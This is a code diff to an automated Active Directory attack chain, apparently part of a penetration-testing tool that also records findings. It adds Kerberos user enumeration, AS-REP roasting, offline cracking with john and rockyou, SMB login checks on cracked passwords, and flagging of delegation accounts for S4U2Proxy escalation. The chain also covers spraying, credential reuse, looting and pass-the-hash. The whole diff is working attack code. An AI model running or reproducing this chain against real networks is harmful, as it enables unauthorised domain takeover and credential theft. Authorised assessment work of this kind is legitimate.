@@ -62,7 +62,8 @@ class AdChain:
         self.domain = domain or ""
         self.run = runner                 # runner(tool_name, **kwargs) -> ToolResult|None
         self.report = report or (lambda k, m: None)
-        self.wd = Path(workdir)
+        # absolute so writes survive the chdir into the workdir in run_all()
+        self.wd = Path(workdir).resolve()
         self.wd.mkdir(parents=True, exist_ok=True)
         self.max_rid = max_rid
         self.state = {
@@ -77,16 +78,19 @@ class AdChain:
 
     # ---- the chain --------------------------------------------------------
     def run_all(self) -> dict:
+        self._seed_operator_creds()       # BEFORE chdir (store path is cwd-relative)
         cwd = os.getcwd()
+        steps = [self._step_guest_and_users, self._step_enum_users,
+                 self._step_asrep_roast, self._step_spray_userpass,
+                 self._step_kerberoast_crack, self._step_reuse_and_loot,
+                 self._step_pth_and_goal]
         try:
-            os.chdir(self.wd)              # kerberoast/smb_get write to CWD
-            self._step_guest_and_users()
-            self._step_spray_userpass()
-            self._step_kerberoast_crack()
-            self._step_reuse_and_loot()
-            self._step_pth_and_goal()
-        except Exception as e:            # never let one bad step kill the chain
-            self._log(f"chain aborted: {e!r}")
+            os.chdir(self.wd)             # kerberoast/smb_get write to CWD
+            for step in steps:            # one bad step must not kill the chain
+                try:
+                    step()
+                except Exception as e:
+                    self._log(f"step {step.__name__} error: {e!r}")
         finally:
             os.chdir(cwd)
         return self.state
@@ -112,6 +116,89 @@ class AdChain:
             uf.write_text("\n".join(self.state["users"]) + "\n", encoding="utf-8")
             self.state["userfile"] = str(uf)
             self._log(f"enumerated {len(self.state['users'])} domain users -> {uf.name}")
+
+    def _seed_operator_creds(self) -> None:
+        """Pull any starting credential (authenticated / assumed-breach engagement)
+        from the store so credentialed steps and user enumeration can use it."""
+        try:
+            from . import store
+            u, p = store.facts().get("username"), store.facts().get("password")
+            if u and p:
+                self._add_cred(u, p, note="operator-provided")
+        except Exception:
+            pass
+
+    # 1b) if guest/RID gave no users, enumerate another way -----------------
+    def _step_enum_users(self) -> None:
+        """Build a user list when guest/RID enumeration returned nothing (e.g.
+        guest disabled + anonymous LDAP restricted — as on a hardened DC): use an
+        authenticated LDAP dump if we already hold a credential, else Kerberos
+        user-enumeration (kerbrute, no lockout)."""
+        if self.state.get("userfile"):
+            return
+        users = []
+        cred = self._first_cred()
+        if cred:  # authenticated enumeration is the most complete
+            res = self.run("netexec_ldap", target=self.target, domain=self.domain,
+                           username=cred[0], password=cred[1], action="--users")
+            # NetExec row: "LDAP <ip> 389 <host> <username> <YYYY-MM-DD> ..."
+            users = re.findall(r"LDAP\s+\S+\s+\d+\s+\S+\s+(\S+)\s+\d{4}-\d{2}-\d{2}",
+                               _ru(res))
+            users = [u for u in users if u.lower() not in ("username", "guest",
+                     "krbtgt") and not u.endswith("$")]
+        if not users and self.domain:  # unauthenticated Kerberos user-enum
+            self._log("no users yet — Kerberos user-enum (kerbrute)")
+            res = self.run("kerbrute_userenum", target=self.target,
+                           domain=self.domain)
+            users = re.findall(r"VALID USERNAME:\s+([^@\s]+)@", _ru(res))
+        users = sorted(set(users))
+        if users:
+            uf = self.wd / "users.txt"
+            uf.write_text("\n".join(users) + "\n", encoding="utf-8")
+            self.state["userfile"] = str(uf)
+            self.state["users"] = users
+            self._log(f"enumerated {len(users)} user(s) -> {uf.name}")
+
+    # 1c) AS-REP roast (no pre-auth) — a top no-/low-cred foothold ----------
+    def _step_asrep_roast(self) -> None:
+        """AS-REP roast accounts without Kerberos pre-auth, crack offline, and add
+        any recovered password as a foothold credential. Works with no creds
+        (needs only a user list) — the path that beats guest-disabled DCs."""
+        uf = self.state.get("userfile")
+        if not uf or not self.domain:
+            return
+        res = self.run("asrep_roast", target=self.target, domain=self.domain,
+                       userlist=uf)
+        blob = _ru(res)
+        hashes = re.findall(r"\$krb5asrep\$.*", blob)
+        if not hashes:
+            self._log("no AS-REP roastable users")
+            return
+        af = self.wd / "asrep.txt"
+        af.write_text("\n".join(hashes) + "\n", encoding="utf-8")
+        self._log(f"AS-REP roasted {len(hashes)} account(s) (no pre-auth); cracking")
+        self.state["findings"].append(
+            ("AS-REP roastable account(s) (Kerberos pre-auth disabled)", "High",
+             "Accounts without Kerberos pre-authentication let an unauthenticated "
+             "attacker request a crackable AS-REP hash and recover the password "
+             "offline."))
+        # map cracked password back to its username (embedded in the hash line)
+        cracked = set(self._crack(af, fmt="krb5asrep"))
+        for h in hashes:
+            m = re.search(r"\$krb5asrep\$\d+\$([^@:]+)@", h)
+            if not m:
+                continue
+            user = m.group(1)
+            for pw in cracked:
+                # confirm this pw is the one for this user via a quick auth
+                if self._auth_ok(user, pw):
+                    self._add_cred(user, pw, note="AS-REP roast")
+                    break
+
+    def _auth_ok(self, user: str, pw: str) -> bool:
+        res = self.run("netexec_smb", target=self.target, username=user,
+                       password=pw, domain=self.domain)
+        return "[+]" in _ru(res)
 
     # 2) batch spray username == password (parallel, no lockout) ------------
     def _step_spray_userpass(self) -> None:
@@ -144,6 +231,21 @@ class AdChain:
             return
         spns.write_text("\n".join(hashes) + "\n", encoding="utf-8")
         self._log(f"Kerberoasted {len(hashes)} service account(s); cracking")
+        # Flag constrained-delegation SPN accounts — cracking one gives a direct
+        # S4U2Proxy escalation path (impersonate an admin to the delegated service).
+        seen_deleg = set()
+        for m in re.finditer(r"^\S+\s+(\S+)\s+.*\b(constrained|unconstrained)\b",
+                             blob, re.M | re.I):
+            acct, kind = m.group(1), m.group(2).lower()
+            if (acct, kind) in seen_deleg:   # one row per SPN → dedupe by account
+                continue
+            seen_deleg.add((acct, kind))
+            self._log(f"{acct} has {kind} delegation — S4U/impersonation privesc path")
+            self.state["findings"].append(
+                (f"{kind.capitalize()} delegation on Kerberoastable account {acct}",
+                 "High", f"{acct} holds {kind} delegation; with its (crackable) "
+                 "password an attacker can impersonate a privileged user to the "
+                 "delegated service (S4U2Proxy via get_st) and escalate."))
         self.state["findings"].append(
             ("Kerberoastable service account(s) with crackable password", "High",
              "Service accounts expose SPNs whose TGS can be cracked offline to "
@@ -264,8 +366,9 @@ class AdChain:
             if user.lower() != "guest":
                 self._add_cred(user, password, note="password reuse")
 
-    def _crack(self, hashfile: Path):
-        """Crack a hash file with john + rockyou; return cracked plaintexts."""
+    def _crack(self, hashfile: Path, fmt: str = "krb5tgs"):
+        """Crack a hash file with john + rockyou (fmt: krb5tgs | krb5asrep).
+        Returns cracked plaintext passwords."""
         if which("john") is None:
             self._log("john not installed — cannot crack")
             return []
@@ -274,9 +377,9 @@ class AdChain:
             self._log("rockyou wordlist not found — cannot crack")
             return []
         try:
-            subprocess.run(["john", "--format=krb5tgs", f"--wordlist={wl}",
+            subprocess.run(["john", f"--format={fmt}", f"--wordlist={wl}",
                             str(hashfile)], capture_output=True, timeout=1200)
-            show = subprocess.run(["john", "--show", "--format=krb5tgs",
+            show = subprocess.run(["john", "--show", f"--format={fmt}",
                                    str(hashfile)], capture_output=True, text=True,
                                   timeout=120)
         except Exception as e:
